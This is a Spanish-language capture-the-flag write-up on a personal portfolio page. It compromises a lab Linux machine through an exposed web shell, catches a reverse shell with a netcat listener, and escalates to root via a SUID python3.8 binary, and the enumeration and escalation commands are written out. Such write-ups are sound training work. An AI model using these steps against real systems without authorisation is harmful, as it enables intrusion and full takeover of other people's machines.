<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Walking Dead</title>
    <link href="../style/estilo.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script>hljs.highlightAll();</script>
</head>

<body class="bg-gray-900 text-white">

    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div class="flex justify-between items-center h-16">
            <div class="flex-shrink-0">
            <h1>Santiago Lorenzo</h1>
            </div>
            <div class="hidden md:flex space-x-4">
            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
            <a href="../writeup.html" class="hover:text-blue-400 transition">Write-ups</a>
            </div>
        </div>
        </div>
    </nav>

    <main class="max-w-4xl mx-auto px-6 py-12">

    <h1 class="text-4xl font-bold mb-2">üîπMaquina: Escolares</h1>
    <p class="text-gray-400 text-sm mb-8">üìÖ Publicado el 19/08/2025 | Categor√≠a: LINUX </p>

    <section class="mb-8">
        <h2 class="text-2xl font-semibold mb-2">üìù Descripci√≥n</h2>
        <p class="text-gray-300 leading-relaxed">
            Este reto consiste en comprometer una m√°quina Linux en un entorno controlado. No se proporciona una flag directa,
            pero el objetivo es obtener acceso privilegiado (root) y entender el vector de escalada.
        </p>
    </section>

    <!----------------- An√°lisis ----------------------->
    <section class="mb-8">
        <h2 class="text-2xl font-semibold mb-2">üîç An√°lisis inicial</h2>
        <p class="text-gray-300 mb-4">
            El an√°lisis comenz√≥ con un reconocimiento b√°sico utilizando herramientas de enumeraci√≥n para comprender los servicios expuestos.
        </p>
        <pre><code class="language-bash">
            sudo nmap -p- -open -O -sS -sC -min-rate 5000 -n -Pn 172.17.0.2
            
                PORT   STATE SERVICE
                22/tcp open  ssh
                | ssh-hostkey: 
                |   3072 0d:09:9d:0f:dc:43:54:cd:39:a9:e2:d6:81:74:40:e8 (RSA)
                |   256 09:d0:f6:52:00:3f:21:51:19:b1:c6:7a:f4:ff:21:01 (ECDSA)
                |_  256 19:e0:b3:72:bd:e9:1e:8d:4c:c4:fd:1f:da:3f:a5:cf (ED25519)
                80/tcp open  http
                |_http-title: The Walking Dead - CTF
        </code></pre>

        <p class="text-gray-300 mb-4">
            En el inicio vemos que el atributo href="hidden/.shell.php" es una redirecci√≥n hacia ese recurso, 
            es decir, si lo visitas manualmente en el navegador (http://172.17.0.2/hidden/.shell.php)
        </p>

        <img src="../Assets/walking_dead/1_172.17.0.2.png" class="mb-4" alt="inicio">


        <p class="text-gray-300 mb-4">
            Al ver esto probamos si se puede usar como web shell
        </p>

        <img src="../Assets/walking_dead/2_shell-web.png" class="mb-4" alt="inicio">

        <p class="text-gray-300 mb-4">
            Efectivamente, aprovechando esto nos devolvemos una shell 
            pero la vovemos a url con burp suite:
        </p>

        <img src="../Assets/walking_dead/3_burp-suit.png" class="mb-4" alt="inicio">
        
        <p class="text-gray-300 mb-4">
            Ya tenemos acceso:
        </p>

        <pre><code class="language-bash">
            nc -lvnp 4444
                listening on [any] 4444 ...
                connect to [192.168.1.9] from (UNKNOWN) [172.17.0.2] 33564
                bash: cannot set terminal process group (23): Inappropriate ioctl for device
                bash: no job control in this shell
                www-data@c2009a8a5c7c:/var/www/html/hidden$ ls
        </code></pre>

        <p class="text-gray-300 mb-4">
            Mejore la shell con:
        </p>

        <pre><code class="language-bash">
            python3 -c 'import pty; pty.spawn("/bin/bash")'
        </code></pre>

        <p class="text-gray-300 mb-4">
            Luego verificamos los binarios SUID disponibles:
        </p>

        <pre><code class="language-bash">
            find / -perm -4000 -type f 2>/dev/null

                /usr/lib/dbus-1.0/dbus-daemon-launch-helper
                /usr/lib/openssh/ssh-keysign
                /usr/bin/gpasswd
                /usr/bin/su
                /usr/bin/man
                /usr/bin/umount
                /usr/bin/chfn
                /usr/bin/newgrp
                /usr/bin/passwd
                /usr/bin/mount
                /usr/bin/chsh
                /usr/bin/python3.8
                /usr/bin/sudo
        </code></pre>

    <!-- Explotaci√≥n / Resoluci√≥n -->
    <section class="mb-8">
        <h2 class="text-2xl font-semibold mb-2">üí£ Escalada de privilegios / Resoluci√≥n</h2>
        <p class="text-gray-300 mb-4">
            Entre ellos encontramos /usr/bin/python3.8, 
            lo cual permite ejecutar c√≥digo con privilegios elevados. 
            Aprovechamos esto para escalar a root:
        </p>

        <pre><code class="language-bash">
        /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
        </code></pre>

        <p class="text-gray-300 mb-4">
            Listo:
        </p>

        <pre><code class="language-bash">
            whoami
                root
        </code></pre>
    </section>

    <!-- Resultado final -->
    <section class="mb-8">
        <h2 class="text-2xl font-semibold mb-2">üèÜ Resultado</h2>
        <p class="text-gray-300">
            Conseguimos acceso como <code>root</code>.
        </p>
    </section>

    <div class="mt-10">
        <a href="../writeup.html"
            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
            ‚Üê Volver a la lista de Write-ups
        </a>
    </div>

    </main>

</body>
</html>
